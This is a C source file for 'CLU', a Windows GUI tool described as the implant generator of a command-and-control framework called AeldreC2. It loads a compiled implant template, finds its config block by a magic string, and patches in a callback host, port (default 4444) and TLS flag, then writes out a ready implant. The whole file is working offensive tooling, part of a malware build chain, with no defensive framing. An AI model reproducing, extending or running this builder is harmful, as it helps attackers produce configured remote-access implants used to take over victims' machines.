/*
 * clu.c  --  AeldreC2 CLU implant generator
 *
 * Takes a compiled tank.exe (or tank16.exe) as a template, locates the
 * patchable config block by its magic "AELDRECLU0001", overwrites the
 * host / port / tls fields, and writes the patched binary as a new file.
 *
 * The config block layout (must match tank.c / tank16.c):
 *
 *   Offset  Size  Field
 *   ------  ----  -----
 *     0      14   magic: "AELDRECLU0001"
 *    14      64   host (NUL-terminated, zero-padded)
 *    78       2   port (little-endian WORD)
 *    80       1   tls  (0 or 1)
 *
 * Build:
 *   wmake -f Makefile.wc clu
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <commdlg.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

/* ----------------------------------------------------------------
 * Control IDs
 * ---------------------------------------------------------------- */
#define IDC_LBL_TMPL   100
#define IDC_EDT_TMPL   101
#define IDC_BTN_TMPL   102
#define IDC_LBL_OUT    103
#define IDC_EDT_OUT    104
#define IDC_BTN_OUT    105
#define IDC_LBL_HOST   106
#define IDC_EDT_HOST   107
#define IDC_LBL_PORT   108
#define IDC_EDT_PORT   109
#define IDC_CHK_TLS    110
#define IDC_BTN_GEN    111
#define IDC_BTN_EXIT   112

#define MAGIC       "AELDRECLU0001"
#define MAGIC_LEN   14
#define BLOCK_TOTAL 81  /* 14 + 64 + 2 + 1 */

static HINSTANCE g_hinst = NULL;

/* ----------------------------------------------------------------
 * Helpers
 * ---------------------------------------------------------------- */
static void error_box(HWND hwnd, const char *msg)
{
    MessageBox(hwnd, msg, "CLU", MB_OK | MB_ICONERROR);
}

/*
 * Read entire file into a malloc'd buffer.  Returns NULL on failure.
 * *out_size receives byte count.
 */
static char *read_file(const char *path, DWORD *out_size)
{
    HANDLE hf;
    DWORD  sz, rd;
    char  *buf;

    hf = CreateFile(path, GENERIC_READ, FILE_SHARE_READ,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;
    sz  = GetFileSize(hf, NULL);
    buf = (char *)malloc(sz);
    if (!buf) { CloseHandle(hf); return NULL; }
    if (!ReadFile(hf, buf, sz, &rd, NULL) || rd != sz) {
        free(buf); CloseHandle(hf); return NULL;
    }
    CloseHandle(hf);
    *out_size = sz;
    return buf;
}

static int write_file(const char *path, const char *buf, DWORD sz)
{
    HANDLE hf;
    DWORD  written;
    hf = CreateFile(path, GENERIC_WRITE, 0,
                    NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    WriteFile(hf, buf, sz, &written, NULL);
    CloseHandle(hf);
    return (written == sz);
}

/* ----------------------------------------------------------------
 * Core patch logic
 * ---------------------------------------------------------------- */
static int patch_binary(HWND hwnd,
                        const char *tmpl_path,
                        const char *out_path,
                        const char *host,
                        int port,
                        int tls_flag)
{
    char  *buf;
    DWORD  sz;
    DWORD  i;
    int    found = 0;
    WORD   port_le;
    BYTE   tls_byte;
    char   msg2[MAX_PATH + 64];

    buf = read_file(tmpl_path, &sz);
    if (!buf) {
        error_box(hwnd, "Cannot read template file.");
        return 0;
    }

    /* Search for magic */
    for (i = 0; i + BLOCK_TOTAL <= sz; i++) {
        if (memcmp(buf + i, MAGIC, MAGIC_LEN) == 0) {
            found = 1;
            break;
        }
    }
    if (!found) {
        free(buf);
        error_box(hwnd, "Magic \"AELDRECLU0001\" not found in template.\r\n"
                        "Make sure the template was compiled from tank.c or tank16.c.");
        return 0;
    }

    /* Patch host[64] at offset 14 */
    memset(buf + i + 14, 0, 64);
    strncpy(buf + i + 14, host, 63);

    /* Patch port at offset 78 (little-endian WORD) */
    port_le = (WORD)port;
    memcpy(buf + i + 78, &port_le, 2);

    /* Patch tls at offset 80 */
    tls_byte = (BYTE)(tls_flag ? 1 : 0);
    buf[i + 80] = (char)tls_byte;

    if (!write_file(out_path, buf, sz)) {
        free(buf);
        sprintf(msg2, "Cannot write output file:\r\n%s", out_path);
        error_box(hwnd, msg2);
        return 0;
    }
    free(buf);

    sprintf(msg2, "Generated:\r\n%s\r\n\r\nHost: %s  Port: %d  TLS: %s",
            out_path, host, port, tls_flag ? "yes" : "no");
    MessageBox(hwnd, msg2, "CLU", MB_OK | MB_ICONINFORMATION);
    return 1;
}

/* ----------------------------------------------------------------
 * Main dialog
 * ---------------------------------------------------------------- */
static LRESULT CALLBACK DlgProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    (void)lp;
    switch (msg) {

    case WM_CREATE: {
        HFONT hf = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
        HWND  hw;
        int   y;

        /* Template row */
        y = 12;
        hw = CreateWindow("STATIC", "Template:", WS_CHILD|WS_VISIBLE|SS_LEFT,
                          8, y+3, 70, 18, hwnd, (HMENU)IDC_LBL_TMPL, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);
        hw = CreateWindow("EDIT", "", WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL,
                          82, y, 320, 22, hwnd, (HMENU)IDC_EDT_TMPL, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);
        hw = CreateWindow("BUTTON", "Browse...", WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,
                          408, y, 76, 22, hwnd, (HMENU)IDC_BTN_TMPL, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);

        /* Output row */
        y = 42;
        hw = CreateWindow("STATIC", "Output:", WS_CHILD|WS_VISIBLE|SS_LEFT,
                          8, y+3, 70, 18, hwnd, (HMENU)IDC_LBL_OUT, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);
        hw = CreateWindow("EDIT", "", WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL,
                          82, y, 320, 22, hwnd, (HMENU)IDC_EDT_OUT, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);
        hw = CreateWindow("BUTTON", "Browse...", WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,
                          408, y, 76, 22, hwnd, (HMENU)IDC_BTN_OUT, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);

        /* Host row */
        y = 76;
        hw = CreateWindow("STATIC", "Host:", WS_CHILD|WS_VISIBLE|SS_LEFT,
                          8, y+3, 70, 18, hwnd, (HMENU)IDC_LBL_HOST, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);
        hw = CreateWindow("EDIT", "127.0.0.1", WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL,
                          82, y, 200, 22, hwnd, (HMENU)IDC_EDT_HOST, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);

        /* Port row */
        hw = CreateWindow("STATIC", "Port:", WS_CHILD|WS_VISIBLE|SS_LEFT,
                          296, y+3, 40, 18, hwnd, (HMENU)IDC_LBL_PORT, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);
        hw = CreateWindow("EDIT", "4444", WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL|ES_NUMBER,
                          338, y, 70, 22, hwnd, (HMENU)IDC_EDT_PORT, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);

        /* TLS checkbox */
        hw = CreateWindow("BUTTON", "TLS", WS_CHILD|WS_VISIBLE|BS_AUTOCHECKBOX,
                          420, y+2, 60, 18, hwnd, (HMENU)IDC_CHK_TLS, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);

        /* Buttons */
        y = 112;
        hw = CreateWindow("BUTTON", "Generate", WS_CHILD|WS_VISIBLE|BS_DEFPUSHBUTTON,
                          116, y, 110, 28, hwnd, (HMENU)IDC_BTN_GEN, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);
        hw = CreateWindow("BUTTON", "Exit", WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,
                          260, y, 110, 28, hwnd, (HMENU)IDC_BTN_EXIT, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);

        return 0;
    }

    case WM_COMMAND:
        switch (LOWORD(wp)) {

        case IDC_BTN_TMPL: {
            OPENFILENAME ofn;
            char path[MAX_PATH];
            path[0] = '\0';
            memset(&ofn, 0, sizeof(ofn));
            ofn.lStructSize = sizeof(ofn);
            ofn.hwndOwner   = hwnd;
            ofn.lpstrFilter = "Executables (*.exe)\0*.exe\0All Files (*.*)\0*.*\0";
            ofn.lpstrFile   = path;
            ofn.nMaxFile    = MAX_PATH;
            ofn.lpstrTitle  = "Select Tank template binary";
            ofn.Flags       = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;
            if (GetOpenFileName(&ofn))
                SetDlgItemText(hwnd, IDC_EDT_TMPL, path);
            return 0;
        }

        case IDC_BTN_OUT: {
            OPENFILENAME ofn;
            char path[MAX_PATH];
            path[0] = '\0';
            memset(&ofn, 0, sizeof(ofn));
            ofn.lStructSize = sizeof(ofn);
            ofn.hwndOwner   = hwnd;
            ofn.lpstrFilter = "Executables (*.exe)\0*.exe\0All Files (*.*)\0*.*\0";
            ofn.lpstrFile   = path;
            ofn.nMaxFile    = MAX_PATH;
            ofn.lpstrTitle  = "Save patched binary as";
            ofn.lpstrDefExt = "exe";
            ofn.Flags       = OFN_OVERWRITEPROMPT;
            if (GetSaveFileName(&ofn))
                SetDlgItemText(hwnd, IDC_EDT_OUT, path);
            return 0;
        }

        case IDC_BTN_GEN: {
            char tmpl[MAX_PATH], out[MAX_PATH], host[64], port_str[8];
            int  port, tls;

            GetDlgItemText(hwnd, IDC_EDT_TMPL, tmpl, MAX_PATH);
            GetDlgItemText(hwnd, IDC_EDT_OUT,  out,  MAX_PATH);
            GetDlgItemText(hwnd, IDC_EDT_HOST, host, sizeof(host));
            GetDlgItemText(hwnd, IDC_EDT_PORT, port_str, sizeof(port_str));
            port = atoi(port_str);
            tls  = (SendDlgItemMessage(hwnd, IDC_CHK_TLS, BM_GETCHECK, 0, 0) == BST_CHECKED);

            if (tmpl[0] == '\0') { error_box(hwnd, "No template file selected."); return 0; }
            if (out[0]  == '\0') { error_box(hwnd, "No output file specified.");   return 0; }
            if (host[0] == '\0') { error_box(hwnd, "Host is empty.");              return 0; }
            if (port <= 0 || port > 65535) { error_box(hwnd, "Invalid port (1-65535)."); return 0; }

            patch_binary(hwnd, tmpl, out, host, port, tls);
            return 0;
        }

        case IDC_BTN_EXIT:
        case IDCANCEL:
            DestroyWindow(hwnd);
            return 0;
        }
        return 0;

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wp, lp);
}

/* ----------------------------------------------------------------
 * WinMain
 * ---------------------------------------------------------------- */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
                   LPSTR lpCmd, int nShow)
{
    WNDCLASS wc;
    HWND     hwnd;
    MSG      msg;

    (void)lpCmd;

    g_hinst = hInst;

    if (!hPrev) {
        memset(&wc, 0, sizeof(wc));
        wc.lpfnWndProc   = DlgProc;
        wc.hInstance     = hInst;
        wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
        wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
        wc.lpszClassName = "CluMain";
        RegisterClass(&wc);
    }

    hwnd = CreateWindowEx(
        WS_EX_DLGMODALFRAME,
        "CluMain",
        "CLU  \xe6ldreC2 Implant Generator",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT,
        502, 162,
        NULL, NULL, hInst, NULL);

    if (!hwnd) return 1;

    ShowWindow(hwnd, nShow);
    UpdateWindow(hwnd);

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (!hPrev)
        UnregisterClass("CluMain", hInst);

    return (int)msg.wParam;
}
